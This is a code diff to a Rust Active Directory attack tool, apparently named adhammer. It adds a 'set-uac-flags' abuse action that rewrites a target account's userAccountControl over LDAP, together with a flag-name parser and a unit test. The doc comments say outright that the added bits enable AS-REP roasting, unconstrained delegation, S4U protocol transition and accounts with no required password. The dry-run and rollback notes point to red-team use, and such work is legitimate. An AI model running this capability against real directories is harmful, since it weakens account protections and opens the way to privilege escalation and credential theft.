@@ -71,6 +71,19 @@ pub(crate) enum AbuseAction {
     /// or (cleaner) `Collector::modify_replace` the attribute back to empty via an LDAP
     /// tool that supports Delete (adhammer's collector currently exposes Replace only).
     AllowedToAct,
+    /// SetUacFlags: OR-in one or more UAC bits on --target's userAccountControl.
+    ///
+    /// Common bits (all uppercase, comma-separated in --value):
+    ///   DONT_REQUIRE_PREAUTH       — enables AS-REP roasting
+    ///   TRUSTED_FOR_DELEGATION     — enables Unconstrained Delegation
+    ///   TRUSTED_TO_AUTH_FOR_DELEGATION — enables S4U protocol transition
+    ///   DONT_EXPIRE_PASSWORD       — password never expires
+    ///   ACCOUNTDISABLE             — disables the account
+    ///   PASSWD_NOTREQD             — no password required
+    ///
+    /// Rollback: `attack abuse --action set-uac-flags --target <account> --value <original-bits>`
+    /// — requires knowing the original value. Use --dry-run to capture first.
+    SetUacFlags,
 }
 
 #[derive(Parser)]
@@ -368,6 +381,32 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
                 rid, a.target
             );
         }
+        AbuseAction::SetUacFlags => {
+            let add_bits = parse_uac_flags(&a.value)
+                .with_context(|| format!("--value {:?} — parse UAC flag names", a.value))?;
+            let cur_text = c
+                .read_text(&target_dn, "userAccountControl")
+                .await?
+                .context("target has no readable userAccountControl")?;
+            let cur: u32 = cur_text
+                .parse()
+                .with_context(|| format!("userAccountControl {cur_text:?} not a u32"))?;
+            let new = cur | add_bits;
+            if a.dry_run {
+                println!(
+                    "[dry-run] would write userAccountControl={:#010x} (was {:#010x}) on {}",
+                    new, cur, target_dn
+                );
+                println!("[dry-run] no change made");
+                return Ok(());
+            }
+            c.modify_replace(&target_dn, "userAccountControl", &new.to_string())
+                .await?;
+            println!(
+                "[+] set userAccountControl={:#010x} (was {:#010x}) on {}",
+                new, cur, a.target
+            );
+        }
         AbuseAction::GpoLinkModify => {
             // Read current gPLink text (may be empty). Append the new link entry.
             // Full form: `[LDAP://cn={GUID},cn=policies,cn=system,<base>;0]`.
@@ -408,6 +447,55 @@ fn hex_of(b: &[u8]) -> String {
         let _ = write!(s, "{byte:02X}");
     }
     s
+}
+
+/// Comma-separated UAC bit names → OR'd bitmask. Accepts hex (`0x400000`),
+/// decimal, and the standard MS-ADTS §2.2.16 mnemonics. Empty tokens ignored.
+fn parse_uac_flags(raw: &str) -> anyhow::Result<u32> {
+    let mut bits: u32 = 0;
+    for tok in raw.split(',').map(|s| s.trim()).filter(|s| !s.is_empty()) {
+        let name = tok.to_ascii_uppercase();
+        let v = match name.as_str() {
+            "SCRIPT" => 0x0000_0001,
+            "ACCOUNTDISABLE" => 0x0000_0002,
+            "HOMEDIR_REQUIRED" => 0x0000_0008,
+            "LOCKOUT" => 0x0000_0010,
+            "PASSWD_NOTREQD" => 0x0000_0020,
+            "PASSWD_CANT_CHANGE" => 0x0000_0040,
+            "ENCRYPTED_TEXT_PWD_ALLOWED" => 0x0000_0080,
+            "TEMP_DUPLICATE_ACCOUNT" => 0x0000_0100,
+            "NORMAL_ACCOUNT" => 0x0000_0200,
+            "INTERDOMAIN_TRUST_ACCOUNT" => 0x0000_0800,
+            "WORKSTATION_TRUST_ACCOUNT" => 0x0000_1000,
+            "SERVER_TRUST_ACCOUNT" => 0x0000_2000,
+            "DONT_EXPIRE_PASSWORD" => 0x0001_0000,
+            "MNS_LOGON_ACCOUNT" => 0x0002_0000,
+            "SMARTCARD_REQUIRED" => 0x0004_0000,
+            "TRUSTED_FOR_DELEGATION" => 0x0008_0000,
+            "NOT_DELEGATED" => 0x0010_0000,
+            "USE_DES_KEY_ONLY" => 0x0020_0000,
+            "DONT_REQUIRE_PREAUTH" => 0x0040_0000,
+            "PASSWORD_EXPIRED" => 0x0080_0000,
+            "TRUSTED_TO_AUTH_FOR_DELEGATION" => 0x0100_0000,
+            "PARTIAL_SECRETS_ACCOUNT" => 0x0400_0000,
+            _ => {
+                if let Some(hex) = name.strip_prefix("0X") {
+                    u32::from_str_radix(hex, 16)
+                        .with_context(|| format!("unknown UAC flag {tok:?}"))?
+                } else if name.chars().all(|c| c.is_ascii_digit()) {
+                    name.parse::<u32>()
+                        .with_context(|| format!("unknown UAC flag {tok:?}"))?
+                } else {
+                    anyhow::bail!("unknown UAC flag {tok:?}");
+                }
+            }
+        };
+        bits |= v;
+    }
+    if bits == 0 {
+        anyhow::bail!("set-uac-flags needs --value <FLAG[,FLAG...]> (empty)");
+    }
+    Ok(bits)
 }
 
 /// Normalize a GPO GUID string to `{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}` (uppercase braces).
@@ -739,6 +827,23 @@ mod tests {
             entry,
             "[LDAP://cn={AB-CD},cn=policies,cn=system,DC=lab,DC=local;0]"
         );
+    }
+
+    #[test]
+    fn parse_uac_flags_or_and_hex() {
+        // Mnemonic OR
+        assert_eq!(
+            parse_uac_flags("DONT_REQUIRE_PREAUTH, TRUSTED_FOR_DELEGATION").unwrap(),
+            0x0040_0000 | 0x0008_0000
+        );
+        // Hex + decimal
+        assert_eq!(parse_uac_flags("0x400000, 512").unwrap(), 0x40_0000 | 512);
+        // Empty → error (don't silently write UAC=0)
+        assert!(parse_uac_flags("").is_err());
+        // Case-insensitive
+        assert_eq!(parse_uac_flags("dont_require_preauth").unwrap(), 0x0040_0000);
+        // Unknown flag rejected
+        assert!(parse_uac_flags("FROBNICATE").is_err());
     }
 
     #[test]
